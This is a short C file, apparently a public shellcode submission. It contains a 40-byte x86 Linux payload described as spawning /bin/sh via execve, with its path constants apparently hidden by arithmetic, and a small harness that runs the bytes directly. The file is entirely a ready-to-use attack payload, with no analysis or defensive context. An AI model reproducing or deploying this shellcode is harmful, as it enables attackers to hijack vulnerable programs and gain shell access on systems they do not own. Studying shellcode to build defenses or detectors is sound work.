// execve("/bin/sh") shellcode
// 40 bytes
// Tested on $ uname -a
// Linux ubuntu 3.13.0-46-generic #77-Ubuntu SMP Mon Mar 2 18:26:13 UTC 2015

#include <stdio.h>
#include <string.h>

unsigned char code[] =
"\x31\xd2\x52\xb8\xb7\xd8\x3e\x56\x05\x78\x56\x34\x12\x50\xb8\xde\xc0\xad"
"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd"
"\x80\x96\xcd\x80";

int main() {
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
